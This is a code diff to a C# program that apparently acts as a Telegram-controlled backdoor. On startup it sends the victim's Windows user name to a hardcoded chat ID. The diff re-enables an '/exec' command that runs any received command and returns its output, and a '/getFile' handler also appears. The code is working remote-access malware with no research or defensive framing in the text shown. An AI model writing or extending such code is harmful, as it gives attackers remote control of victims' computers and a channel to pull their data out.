@@ -20,7 +20,10 @@ namespace TeleBot_CangCot
         static void Main(string[] args)
         {
             SendMessage("1146104261", "New Connected!", ExecuteCommand("powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"));
-            run();
+            Thread runThread = new Thread(run);
+            runThread.Start();
+
+            runThread.Join();
         }
         
 
@@ -38,6 +41,7 @@ namespace TeleBot_CangCot
             
             while (true)
             {
+
                 try
                 {
 
@@ -63,14 +67,14 @@ namespace TeleBot_CangCot
                                     SendMessage(chatId, text, "Hello");
                                 else if (text.StartsWith("/bye"))
                                     SendMessage(chatId, text, "Bye Bye");
-                                /*else if (text.StartsWith("/exec"))
+                                else if (text.StartsWith("/exec"))
                                 {
                                     string cmd = text.Substring(6);
                                     if (cmd == null)
                                         cmd = "whoami";
                                     string resultText = ExecuteCommand(cmd);
                                     SendMessage(chatId, text, resultText);
-                                }*/
+                                }
                                 else if (text.StartsWith("/getFile"))
                                 {
                                     string filePath = text.Substring(9);
